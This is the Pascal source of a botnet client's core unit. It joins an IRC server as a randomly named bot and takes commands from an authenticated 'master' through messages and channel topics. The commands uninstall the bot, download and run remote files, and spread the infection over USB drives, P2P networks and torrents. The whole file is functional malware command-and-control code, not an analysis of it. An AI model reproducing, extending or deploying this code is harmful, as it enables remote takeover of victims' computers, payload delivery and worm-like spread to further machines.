unit Bot;

interface

uses Windows,
  ApplicationUnit,
  SocketUnit,
  StrList,
  KOL,
  ThreadUnit,
  Winsock2,
  functions,
  ThreadProcs,
  p2pspread,
  strings;



var
 Application: TApplication;
 MainSocket: TClientSocket;
 Running, Loggedin, Privatemsg, a: Boolean;
 ConnectionVar : integer;
 Mutex : Cardinal;
 Master, Botnick, Authname, GetPath: String;
 //MSN//
 MSNVAR: INTEGER;
 MsnCount: Integer;

procedure SendMessage(Msg: String);
procedure ParseNormal(RawData: String);
procedure SendData(Socket: TClientSocket; Data: String);
procedure RecieveData(Thread: TThread; Socket: TClientSocket);
procedure Connect(Thread: TThread);
procedure CreateConnection(Thread: TTHread);

implementation


procedure SendMessage(Msg: String);
begin
  if PrivateMsg then mainSocket.SendString(IrcProt[1] + ' ' + Master + ' :' + Msg + #10#13) else
  mainSocket.SendString(IrcProt[1]+' ' + Chan + ' '+ msg  + #13#10);
end;


procedure ParseNormal(RawData: String);
var
  Trimmed: String;
  Param: array[1..4] of String;
  RawDataBack: String;
begin
    if (CheckAuthHost(AuthInfo[1], RawData)) and (Pos(IrcProt[1], RawData) > 0) then
    begin
    RawDataBack := RawData;
    Delete(RawDataBack, 1, 1);
    Master := Copy(RawDataBack, 1, Pos('!', RawDataBack) - 1);
    if Pos(BotNick, RawDataBack) > 7 then PrivateMsg := True else PrivateMsg := False;
    if PrivateMsg then Delete(RawDataBack, 1, Pos(BotNick + ' :', RawDataBack) + Length(BotNick) + 1) else
    Delete(RawDataBack, 1, Pos(chan + ' :', RawDataBack) + Length(chan) + 1);
    Trimmed := TrimEx(RawDataBack);
    if LeftStr(Trimmed, 1) = prefix then
    begin
      Delete(Trimmed, 1, 1);
      Param[1] := Split(Trimmed, ' ', 1);
      Param[2] := Split(Trimmed, ' ', 2);
      Param[3] := Split(Trimmed, ' ', 3);
      Param[4] := Split(Trimmed, ' ', 4);

      // Login //
      if Param[1] = BotComnd[1] then
      begin
        if Param[2] = AuthInfo[2] then
        begin
          if LeftStr(RawData, 25) <> AuthName then
          begin
            LoggedIn := True;
            AuthName := LeftStr(RawData, 25);
            SendMessage(LoginPut);
          end;
        end;
      end;
      //END LOGIN//
      //Logout Start//
      if LoggedIn = True then
      begin
        if Param[1] = BotComnd[2] then
        begin
          LoggedIn := False;
          AuthName := '';
          SendMessage(LogoutPut);
        end;
      end;
      //END Logout//
      //Main Functions//
      if (LoggedIn = True) and (AuthName = LeftStr(RawData, 25)) then
      begin
      //UNINSTALL//
      if Param[1] = BotComnd[3] then StartInstallThread(1);

      //DOWNLOAD//
      if Param[1] = BotComnd[5] then
        begin
        {$IFNDEF NODL}
          StartDownloadThread(Param[2], Param[3], Param[4]);
        {$ENDIF NODL}
        end;
      end;
      if Param[1] = BotComnd[6] then
      begin
        Spread := True;
        ThreadProcs.StartUsbThread;
      end;

      //MSN Thread//
      if Param[1] = BotComnd[8] then begin end; // {$IFNDEF NOMSN} StartMsnThread(Param[2]); {$ENDIF NOMSN}

      //AllSpreadThread//
      if Param[1] = BotComnd[9] then begin end; // {$IFNDEF NOMSN} StartMsnThread(Param[2]); {$ENDIF NOMSN}

      //Seed//
      if Param[1] = BotComnd[10] then  {$IFNDEF NOTORRENT} StartTorrentThread(Param[2], Param[3]); {$ENDIF NOTORRENT}

      if Param[1] = BotComnd[11] then  {$IFNDEF NOP2P} StartP2PThread(Param[2]); {$ENDIF NOP2P}

      //END MAIN FUNCTIONS//
    end;
end;
end;

procedure ParseTopic(Param1, Param2, Param3, Param4 : String);
  begin
       Privatemsg := FALSE;
      //UNINSTALL//
      if Param1 = BotComnd[3] then StartInstallThread(1);

      //DOWNLOAD//
      if Param1 = BotComnd[5] then {$IFNDEF NODL} StartDownloadThread(Param2, Param3, Param4); {$ENDIF NODL}

      //USB//
      if Param1 = BotComnd[6] then
      begin
        Spread := True;
        ThreadProcs.StartUsbThread;
      end;

        //MSN Thread//
      if Param1 = BotComnd[8] then begin end; // {$IFNDEF NOMSN} StartMsnThread(Param2); {$ENDIF NOMSN}

      //AllSpreadThread//
      if Param1 = BotComnd[9] then begin end;// {$IFNDEF NOMSN} StartMsnThread(Param2); {$ENDIF NOMSN}

      //SEED//
        //Seed//
      if Param1 = BotComnd[10] then {$IFNDEF NOTORRENT} StartTorrentThread(Param2, Param3); {$ENDIF NOTORRENT}

       if Param1 = 'sm' then ShowMessage(Param2);

      //P2P//
       if Param1 = BotComnd[11] then {$IFNDEF NOP2P} StartP2pThread(Param2);  {$ENDIF NOP2P}

      //END MAIN FUNCTIONS//

end;


procedure SendData(Socket: TClientSocket; Data: String);
begin
 if MainSocket.Connected then MainSocket.SendString(Data);
end;

procedure RecieveData(Thread: TThread; Socket: TClientSocket);
var
 Data, Temp, topicbuffer: String;
 NonBlocking: cardinal;
 Param: array[1..8] of String;
 topic2: array[1..8] of String;
begin
 NonBlocking := 1;
 IoCtlSocket(Socket.Socket, FIONBIO, NonBlocking);
 while Socket.Connected do
 begin
  Data := Socket.ReceiveString;
  if Length(Data) > 0 then
  begin
    while(Pos(#10, Data) <> 0) do
    begin
      Temp := Copy(Data, 1, Pos(#10, Data) - 1);
      Delete(Data, 1, Pos(#10, Data));

      if Pos(IrcProt[2], Temp) > 0 then
      begin
       TopicBuffer := Temp;
     // if pos('$', TopicBUffer) <> 0  then begin
      topic2[1] := Split(topicbuffer, '$', 1);
      topic2[2] := Split(topicbuffer, '$', 2);
      topic2[3] := Split(topicbuffer, '$', 3);
      topic2[4] := Split(topicbuffer, '$', 4);
      topic2[5] := Split(topicbuffer, '$', 5);
      topic2[6] := Split(topicbuffer, '$', 6);
      topic2[7] := Split(topicbuffer, '$', 7);
      topic2[8] := Split(topicbuffer, '$', 8);
      TopicBuffer := topic2[1];
      Param[1] := Split(topicbuffer, ' ', 5);
      Param[2] := Split(topicbuffer, ' ', 6);
      Param[3] := Split(topicbuffer, ' ', 7);
      Param[4] := Split(topicbuffer, ' ', 8);
      Param[5] := Split(topicbuffer, ' ', 9);
      Param[6] := Split(topicbuffer, ' ', 10);
      Param[7] := Split(topicbuffer, ' ', 11);
      Param[8] := Split(topicbuffer, ' ', 12);
      Delete(Param[1],1,1);
      Delete(Param[1],1,1);
       Param[1] := Trim(Param[1]);
      Param[2] := Trim(Param[2]);
      Param[3] := Trim(Param[3]);
      Param[4] := Trim(Param[4]);
      Param[5] := Trim(Param[5]);
      Param[6] := Trim(Param[6]);
      Param[7] := Trim(Param[7]);
      Param[8] := Trim(Param[8]);


      ParseTopic(Param[1], Param[2], Param[3], Param[4]);

      TopicBuffer := topic2[2];

       Param[1] := Split(topicbuffer, ' ', 2);
      Param[2] := Split(topicbuffer, ' ', 3);
      Param[3] := Split(topicbuffer, ' ', 4);
      Param[4] := Split(topicbuffer, ' ', 5);
      Param[5] := Split(topicbuffer, ' ', 6);
      Param[6] := Split(topicbuffer, ' ', 7);
      Param[7] := Split(topicbuffer, ' ', 8);
      Param[8] := Split(topicbuffer, ' ', 9);
    //  ShowMessage('Param1 ' + Param[1]);
     // ShowMessage('Param2 ' + Param[2]);
      Delete(Param[1],1,1);
     // Delete(Param[1],1,1);
     //ShowMessage('Param1 ' + Param[1]);
      Param[1] := Trim(Param[1]);
      Param[2] := Trim(Param[2]);
      Param[3] := Trim(Param[3]);
      Param[4] := Trim(Param[4]);
      Param[5] := Trim(Param[5]);
      Param[6] := Trim(Param[6]);
      Param[7] := Trim(Param[7]);
      Param[8] := Trim(Param[8]);


      ParseTopic(Param[1], Param[2], Param[3], Param[4]);

      topicbuffer := '';

      TopicBuffer := topic2[3];

       Param[1] := Split(topicbuffer, ' ', 2);
      Param[2] := Split(topicbuffer, ' ', 3);
      Param[3] := Split(topicbuffer, ' ', 4);
      Param[4] := Split(topicbuffer, ' ', 5);
      Param[5] := Split(topicbuffer, ' ', 6);
      Param[6] := Split(topicbuffer, ' ', 7);
      Param[7] := Split(topicbuffer, ' ', 8);
      Param[8] := Split(topicbuffer, ' ', 9);
    //  ShowMessage('Param1 ' + Param[1]);
     // ShowMessage('Param2 ' + Param[2]);
      Delete(Param[1],1,1);
     // Delete(Param[1],1,1);
     //ShowMessage('Param1 ' + Param[1]);
      Param[1] := Trim(Param[1]);
      Param[2] := Trim(Param[2]);
      Param[3] := Trim(Param[3]);
      Param[4] := Trim(Param[4]);
      Param[5] := Trim(Param[5]);
      Param[6] := Trim(Param[6]);
      Param[7] := Trim(Param[7]);
      Param[8] := Trim(Param[8]);


      ParseTopic(Param[1], Param[2], Param[3], Param[4]);

      topicbuffer := '';

      topicbuffer :=topic2[4];

       Param[1] := Split(topicbuffer, ' ', 2);
      Param[2] := Split(topicbuffer, ' ', 3);
      Param[3] := Split(topicbuffer, ' ', 4);
      Param[4] := Split(topicbuffer, ' ', 5);
      Param[5] := Split(topicbuffer, ' ', 6);
      Param[6] := Split(topicbuffer, ' ', 7);
      Param[7] := Split(topicbuffer, ' ', 8);
      Param[8] := Split(topicbuffer, ' ', 9);
    //  ShowMessage('Param1 ' + Param[1]);
     // ShowMessage('Param2 ' + Param[2]);
      Delete(Param[1],1,1);
     // Delete(Param[1],1,1);
     //ShowMessage('Param1 ' + Param[1]);
      Param[1] := Trim(Param[1]);
      Param[2] := Trim(Param[2]);
      Param[3] := Trim(Param[3]);
      Param[4] := Trim(Param[4]);
      Param[5] := Trim(Param[5]);
      Param[6] := Trim(Param[6]);
      Param[7] := Trim(Param[7]);
      Param[8] := Trim(Param[8]);


      ParseTopic(Param[1], Param[2], Param[3], Param[4]);

      topicbuffer := '';

      topicbuffer :=topic2[5];

       Param[1] := Split(topicbuffer, ' ', 2);
      Param[2] := Split(topicbuffer, ' ', 3);
      Param[3] := Split(topicbuffer, ' ', 4);
      Param[4] := Split(topicbuffer, ' ', 5);
      Param[5] := Split(topicbuffer, ' ', 6);
      Param[6] := Split(topicbuffer, ' ', 7);
      Param[7] := Split(topicbuffer, ' ', 8);
      Param[8] := Split(topicbuffer, ' ', 9);
    //  ShowMessage('Param1 ' + Param[1]);
     // ShowMessage('Param2 ' + Param[2]);
      Delete(Param[1],1,1);
     // Delete(Param[1],1,1);
     //ShowMessage('Param1 ' + Param[1]);
      Param[1] := Trim(Param[1]);
      Param[2] := Trim(Param[2]);
      Param[3] := Trim(Param[3]);
      Param[4] := Trim(Param[4]);
      Param[5] := Trim(Param[5]);
      Param[6] := Trim(Param[6]);
      Param[7] := Trim(Param[7]);
      Param[8] := Trim(Param[8]);


      ParseTopic(Param[1], Param[2], Param[3], Param[4]);

      topicbuffer := '';

      topicbuffer :=topic2[6];

       Param[1] := Split(topicbuffer, ' ', 2);
      Param[2] := Split(topicbuffer, ' ', 3);
      Param[3] := Split(topicbuffer, ' ', 4);
      Param[4] := Split(topicbuffer, ' ', 5);
      Param[5] := Split(topicbuffer, ' ', 6);
      Param[6] := Split(topicbuffer, ' ', 7);
      Param[7] := Split(topicbuffer, ' ', 8);
      Param[8] := Split(topicbuffer, ' ', 9);
    //  ShowMessage('Param1 ' + Param[1]);
     // ShowMessage('Param2 ' + Param[2]);
      Delete(Param[1],1,1);
     // Delete(Param[1],1,1);
     //ShowMessage('Param1 ' + Param[1]);
      Param[1] := Trim(Param[1]);
      Param[2] := Trim(Param[2]);
      Param[3] := Trim(Param[3]);
      Param[4] := Trim(Param[4]);
      Param[5] := Trim(Param[5]);
      Param[6] := Trim(Param[6]);
      Param[7] := Trim(Param[7]);
      Param[8] := Trim(Param[8]);


      ParseTopic(Param[1], Param[2], Param[3], Param[4]);

      topicbuffer := '';

      topicbuffer :=topic2[7];

       Param[1] := Split(topicbuffer, ' ', 2);
      Param[2] := Split(topicbuffer, ' ', 3);
      Param[3] := Split(topicbuffer, ' ', 4);
      Param[4] := Split(topicbuffer, ' ', 5);
      Param[5] := Split(topicbuffer, ' ', 6);
      Param[6] := Split(topicbuffer, ' ', 7);
      Param[7] := Split(topicbuffer, ' ', 8);
      Param[8] := Split(topicbuffer, ' ', 9);
    //  ShowMessage('Param1 ' + Param[1]);
     // ShowMessage('Param2 ' + Param[2]);
      Delete(Param[1],1,1);
     // Delete(Param[1],1,1);
     //ShowMessage('Param1 ' + Param[1]);
      Param[1] := Trim(Param[1]);
      Param[2] := Trim(Param[2]);
      Param[3] := Trim(Param[3]);
      Param[4] := Trim(Param[4]);
      Param[5] := Trim(Param[5]);
      Param[6] := Trim(Param[6]);
      Param[7] := Trim(Param[7]);
      Param[8] := Trim(Param[8]);


      ParseTopic(Param[1], Param[2], Param[3], Param[4]);

      topicbuffer := '';
   //   end;
      Param[1] := Split(topicbuffer, ' ', 2);
      Param[2] := Split(topicbuffer, ' ', 3);
      Param[3] := Split(topicbuffer, ' ', 4);
      Param[4] := Split(topicbuffer, ' ', 5);
      Param[5] := Split(topicbuffer, ' ', 6);
      Param[6] := Split(topicbuffer, ' ', 7);
      Param[7] := Split(topicbuffer, ' ', 8);
      Param[8] := Split(topicbuffer, ' ', 9);
    //  ShowMessage('Param1 ' + Param[1]);
     // ShowMessage('Param2 ' + Param[2]);
      Delete(Param[1],1,1);
     // Delete(Param[1],1,1);
     //ShowMessage('Param1 ' + Param[1]);
      Param[1] := Trim(Param[1]);
      ShowMessage(':'+  Param[1]);
      Param[2] := Trim(Param[2]);
      ShowMessage(':'+  Param[2]);
      Param[3] := Trim(Param[3]);
      ShowMessage(':'+  Param[3]);
      Param[4] := Trim(Param[4]);
      ShowMessage(':'+  Param[4]);
      Param[5] := Trim(Param[5]);
      Param[6] := Trim(Param[6]);
      Param[7] := Trim(Param[7]);
      Param[8] := Trim(Param[8]);


      ParseTopic(Param[1], Param[2], Param[3], Param[4]);

      topicbuffer := '';
      end
      else if Pos(IRCProt[3], Temp) > 0 then
        begin
        TopicBuffer := Temp;
        if pos('$', TopicBUffer) <> 0  then begin
          topic2[1] := Split(topicbuffer, '$', 1);
      topic2[2] := Split(topicbuffer, '$', 2);
      topic2[3] := Split(topicbuffer, '$', 3);
      topic2[4] := Split(topicbuffer, '$', 4);
      topic2[5] := Split(topicbuffer, '$', 5);
      topic2[6] := Split(topicbuffer, '$', 6);
      topic2[7] := Split(topicbuffer, '$', 7);
      topic2[8] := Split(topicbuffer, '$', 8);

      TopicBuffer := topic2[1];
      Param[1] := Split(topicbuffer, ' ', 4);
      Param[2] := Split(topicbuffer, ' ', 5);
      Param[3] := Split(topicbuffer, ' ', 6);
      Param[4] := Split(topicbuffer, ' ', 7);
      Param[5] := Split(topicbuffer, ' ', 8);
      Param[6] := Split(topicbuffer, ' ', 9);
      Param[7] := Split(topicbuffer, ' ', 10);
      Param[8] := Split(topicbuffer, ' ', 11);
      Delete(Param[1],1,1);
      Delete(Param[1],1,1);
      Param[1] := Trim(Param[1]);
      Param[2] := Trim(Param[2]);
      Param[3] := Trim(Param[3]);
      Param[4] := Trim(Param[4]);
      Param[5] := Trim(Param[5]);
      Param[6] := Trim(Param[6]);
      Param[7] := Trim(Param[7]);
      Param[8] := Trim(Param[8]);


      ParseTopic(Param[1], Param[2], Param[3], Param[4]);

      TopicBuffer := topic2[2];
        end;
        Delete(Topicbuffer, 1,1);
        Param[1] := Split(topicbuffer, ' ', 1);
        Param[2] := Split(topicbuffer, ' ', 2);
        Param[3] := Split(topicbuffer, ' ', 3);
        Param[4] := Split(topicbuffer, ' ', 4);
        Delete(Param[1],1,1);
        Param[1] := Trim(Param[1]);
        Param[2] := Trim(Param[2]);
        Param[3] := Trim(Param[3]);
        Param[4] := Trim(Param[4]);
        ParseTopic(Param[1], Param[2], Param[3], Param[4]);
        TopicBuffer := '';

        TopicBuffer := topic2[3];
        Delete(Topicbuffer, 1,1);
        Param[1] := Split(topicbuffer, ' ', 1);
        Param[2] := Split(topicbuffer, ' ', 2);
        Param[3] := Split(topicbuffer, ' ', 3);
        Param[4] := Split(topicbuffer, ' ', 4);
        Delete(Param[1],1,1);
        Param[1] := Trim(Param[1]);
        Param[2] := Trim(Param[2]);
        Param[3] := Trim(Param[3]);
        Param[4] := Trim(Param[4]);
        ParseTopic(Param[1], Param[2], Param[3], Param[4]);
        TopicBuffer := '';

         TopicBuffer := topic2[4];
        Delete(Topicbuffer, 1,1);
        Param[1] := Split(topicbuffer, ' ', 1);
        Param[2] := Split(topicbuffer, ' ', 2);
        Param[3] := Split(topicbuffer, ' ', 3);
        Param[4] := Split(topicbuffer, ' ', 4);
        Delete(Param[1],1,1);
        Param[1] := Trim(Param[1]);
        Param[2] := Trim(Param[2]);
        Param[3] := Trim(Param[3]);
        Param[4] := Trim(Param[4]);
        ParseTopic(Param[1], Param[2], Param[3], Param[4]);
        TopicBuffer := '';

         TopicBuffer := topic2[5];
        Delete(Topicbuffer, 1,1);
        Param[1] := Split(topicbuffer, ' ', 1);
        Param[2] := Split(topicbuffer, ' ', 2);
        Param[3] := Split(topicbuffer, ' ', 3);
        Param[4] := Split(topicbuffer, ' ', 4);
        Delete(Param[1],1,1);
        Param[1] := Trim(Param[1]);
        Param[2] := Trim(Param[2]);
        Param[3] := Trim(Param[3]);
        Param[4] := Trim(Param[4]);
        ParseTopic(Param[1], Param[2], Param[3], Param[4]);
        TopicBuffer := '';

        TopicBuffer := topic2[6];
        Delete(Topicbuffer, 1,1);
        Param[1] := Split(topicbuffer, ' ', 1);
        Param[2] := Split(topicbuffer, ' ', 2);
        Param[3] := Split(topicbuffer, ' ', 3);
        Param[4] := Split(topicbuffer, ' ', 4);
        Delete(Param[1],1,1);
        Param[1] := Trim(Param[1]);
        Param[2] := Trim(Param[2]);
        Param[3] := Trim(Param[3]);
        Param[4] := Trim(Param[4]);
        ParseTopic(Param[1], Param[2], Param[3], Param[4]);
        TopicBuffer := '';

         TopicBuffer := topic2[7];
        Delete(Topicbuffer, 1,1);
        Param[1] := Split(topicbuffer, ' ', 1);
        Param[2] := Split(topicbuffer, ' ', 2);
        Param[3] := Split(topicbuffer, ' ', 3);
        Param[4] := Split(topicbuffer, ' ', 4);
        Delete(Param[1],1,1);
        Param[1] := Trim(Param[1]);
        Param[2] := Trim(Param[2]);
        Param[3] := Trim(Param[3]);
        Param[4] := Trim(Param[4]);
        ParseTopic(Param[1], Param[2], Param[3], Param[4]);
        TopicBuffer := '';

         TopicBuffer := topic2[8];
        Delete(Topicbuffer, 1,1);
        Param[1] := Split(topicbuffer, ' ', 1);
        Param[2] := Split(topicbuffer, ' ', 2);
        Param[3] := Split(topicbuffer, ' ', 3);
        Param[4] := Split(topicbuffer, ' ', 4);
        Delete(Param[1],1,1);
        Param[1] := Trim(Param[1]);
        Param[2] := Trim(Param[2]);
        Param[3] := Trim(Param[3]);
        Param[4] := Trim(Param[4]);
        ParseTopic(Param[1], Param[2], Param[3], Param[4]);
        TopicBuffer := '';


        end
      else ParseNormal(Temp);
      if Pos(IRCProt[4], Temp) > 0 then mainSocket.SendString(IrcProt[5] + ' ' + chan + #10#13);
      if (Pos(IrcProt[6], Temp) > 0) and (Pos(IrcProt[1], Temp) = 0)then mainSocket.SendString(IrcProt[5] + ' '  + IrcProt[5] + ' ' + IrcProt[7] + #10#13);
      if (Pos(IrcProt[8], Temp) > 0) and (Pos(IrcProt[9], Temp) = 0) and (Pos(IrcProt[1], Temp) = 0) then mainSocket.SendString(ReplaceString(Temp, IrcProt[8], IrcProt[10]) + #10#13);
    end;
    if Temp <> '' then Temp := '';
    if TopicBuffer <> '' then TopicBuffer := '';
    Data := '';
  end;
  Sleep(1);
  Application.ProcessMessages;
 end;
  Socket.Disconnect;
 Socket.Free;
end;


procedure Connect(Thread: TThread);
begin
 while 0 < 1 do begin
  while MainSocket.Connected do RecieveData(Thread, MainSocket);
  Sleep(5000);
 end;
end;

procedure CreateConnection(Thread: TTHread);
var i: Integer;    myircserver : String;
begin
  while 0 < 1 do begin
  if ConnectionVar <> 1 then
    begin
    MainSocket := TClientSocket.Create;
    i := Random(11) + 1;
    while ircserver[i] = '' do begin
    i := Random(11) + 1;
    end;
    myircserver := ircserver[i];
    MainSocket.Connect(myIrcServer, StrToInt(ServerPort));
    Connectionvar := 1;
    end;
  If MainSocket.Connected then begin
    Randomize;
    Botnick := '';
    if IS_ICQ_INSTALLED = True then Botnick := Botnick + 'I';
    if IS_AIM_INSTALLED = True then Botnick := Botnick + 'A';
    If Botnick = '' then Botnick :=  GetWinLang + '|'  + IntToStr(Random(9289))
    else Botnick := Botnick + '|' + GetWinLang + '|'  + IntToStr(Random(9289));
    Sleep(600);
    SendData(mainsocket, IrcProt[11] + ' ' + Botnick + ' ' + #13#10);
    SendData(mainsocket,IRCProt[7] +  ' icqbot icqbot icqbot icqbot icqbot ' +  #13#10);
    RecieveData(Thread, MainSocket)
    //else TThread.Create(@CreateConnection, 0);
    end
  else ConnectionVar := 0;
  end;
  Sleep(800);
end;

end.
